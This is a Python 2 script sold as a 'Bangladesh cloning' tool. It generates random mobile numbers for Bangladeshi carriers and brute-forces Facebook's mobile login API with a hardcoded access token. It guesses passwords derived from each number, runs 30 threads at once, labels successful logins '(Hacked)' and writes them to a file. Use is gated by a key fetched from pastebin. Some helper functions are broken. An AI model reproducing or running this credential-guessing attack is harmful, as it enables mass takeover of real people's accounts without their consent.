import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass,uuid,requests

logo2 = """
\x1b[1;96m /$$$$$$$  /$$$$$$ /$$   /$$ /$$$$$$
| $$__  $$|_  $$_/| $$  /$$/|_  $$_/
| $$  \ $$  | $$  | $$ /$$/   | $$  
| $$$$$$$   | $$  | $$$$$/    | $$  
| $$__  $$  | $$  | $$  $$    | $$  
| $$  \ $$  | $$  | $$\  $$   | $$  
| $$$$$$$/ /$$$$$$| $$ \  $$ /$$$$$$
|_______/ |______/|__/  \__/|______/
                                        """
def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;95mWait A Few Moments \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
        
def jenw():
	os.system('rm -rf .txt')
	os.system('clear')                    
	print logo2
	print """\x1b[1;92mSet Phone Number Amount You Want To Clone.
    Example:1000,5000,10000,50000\n"""
	walid =input ('\x1b[1;93mEnter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
	tik()
	for n in range(walid):
		nmbr = random.randint(1111111, 9999999)
		sys.stdout = open('.txt', 'a')
		print nmbr
        sys.stdout.flush()
	
	
	

logo3 =  """
\x1b[1;96m /$$$$$$$  /$$$$$$ /$$   /$$ /$$$$$$
| $$__  $$|_  $$_/| $$  /$$/|_  $$_/
| $$  \ $$  | $$  | $$ /$$/   | $$  
| $$$$$$$   | $$  | $$$$$/    | $$  
| $$__  $$  | $$  | $$  $$    | $$  
| $$  \ $$  | $$  | $$\  $$   | $$  
| $$$$$$$/ /$$$$$$| $$ \  $$ /$$$$$$
|_______/ |______/|__/  \__/|______/
"""

def reg():
    os.system('clear')
    print logo3
    print ''
    wallidm = raw_input('\x1b[1;92m[\xf0\x9f\x94\x91]\x1b[1;93mAPI KEY \xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;92m')
    print ''
    try:
    	r = requests.get('https://pastebin.com/raw/icejZRQk').text
    except requests.exceptions.ConnectionError:
        print "No Internet Connection"
        exit()
    if wallidm in r :
    	os.system('clear')
        print logo3
    	print ("\x1b[1;92m[\xe2\x9c\x93] API KEY \xe2\x80\xa2\xe2\x9e\xa2 " + wallidm + "(Correct)" )
        time.sleep(0.5)
    	jenw()

    else:
    	os.system('clear')
        print logo3
        print ("\x1b[1;91m[\xf0\x9f\x94\x91] API KEY \xe2\x80\xa2\xe2\x9e\xa2 " + wallidm + "(Wrong)" )
        time.sleep(0.5)
        os.system('xdg-open https://Facebook.com/kawsarmisty1257')
        reg()


reg()

	
	
	









	




try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 beta.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;97mWait A Few Moments \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.2)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print 
logo1 = """
\x1b[1;96m /$$$$$$$  /$$$$$$ /$$   /$$ /$$$$$$
| $$__  $$|_  $$_/| $$  /$$/|_  $$_/
| $$  \ $$  | $$  | $$ /$$/   | $$  
| $$$$$$$   | $$  | $$$$$/    | $$  
| $$__  $$  | $$  | $$  $$    | $$  
| $$  \ $$  | $$  | $$\  $$   | $$  
| $$$$$$$/ /$$$$$$| $$ \  $$ /$$$$$$
|_______/ |______/|__/  \__/|______/
"""

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo2
    print '\x1b[1;95mNote:Use Speedest Data For Fastest Cloning '
    print ""
    print '\x1b[1;92m(1) START BANGLADESH CLONING'
    print '\x1b[1;92m(2) SHOW MY CLONED IDS'
    print '\x1b[1;91m(0) EXIT'
    pilih_login()


def pilih_login():
    peak = raw_input("\n\033[1;92mCHOOSE: \033[1;92m")
    if peak =="":
        print "\x1b[1;92mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1] START CRACKING'
    time.sleep(0.10)
    print '\x1b[1;92m[0] back'
    time.sleep(0.10)
    action()

def action():
    peak = raw_input('\n\033[1;92mCHOOSE:\033[1;92m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system('clear')
        print logo1
        print 48 * '\x1b[1;91m-'
        print '\x1b[1;91m[\x1b[1;92mEXAMPLE\x1b[1;91m]\x1b[1;91m [\x1b[1;96mTYPE 2 DIGIT ANY CODE\x1b[1;91m]'
        print 32 * '\x1b[1;91m~'
        print '\x1b[1;91m[\x1b[1;92mEXAMPLE-BANGLALINK\x1b[1;91m] \x1b[1;91m[\x1b[1;92m99,98,97,96,95,94,93,92,91,90\x1b[1;91m]'
        print 62 * '\x1b[1;91m~'
        print '\x1b[1;91m[\x1b[1;92mEXAMPLE-GRAMEENPHONE\x1b[1;91m] \x1b[1;91m[\x1b[1;92m79,78,77,76,75,74,73,72,71,70\x1b[1;91m]'
        print 62 * '\x1b[1;91m~'
        print '\x1b[1;91m[\x1b[1;92mEXAMPLE-AIRTEL\x1b[1;91m] \x1b[1;91m[\x1b[1;92m69,68,67,66,65,64,63,62,61,60\x1b[1;91m]'
        print 62 * '\x1b[1;91m~'
        print '\x1b[1;91m[\x1b[1;92mEXAMPLE-ROBI\x1b[1;91m] \x1b[1;91m[\x1b[1;92m89,88,87,86,85,84,83,82,81,80\x1b[1;91m]'
        print 62 * '\x1b[1;91m~'
        try:
            c = raw_input("\033[1;92mCHOOSE : ")
            k= '01'
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    os.system('clear')
    print logo1
    print 50* '\033[1;92m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;91mPlease Wait Start Cracking...")
    jalan ("\033[1;91mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;92m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m  (Hacked)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;91BIKI  (Cp) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  (Hacked)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                        
                
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print '\x1b[0;93mTotal \x1b[1;92BIKIHacked\x1b[1;94m/\x1b[1;91mBIKICp : \x1b[1;92m' + str(len(oks)) + '\x1b[1;94m/\x1b[1;91m' + str(len(cpb))
    raw_input('\n\x1b[1;92m[\x1b[1;92BIKIBack\x1b[1;95m]')
    exit()

if __name__ == '__main__':
    login()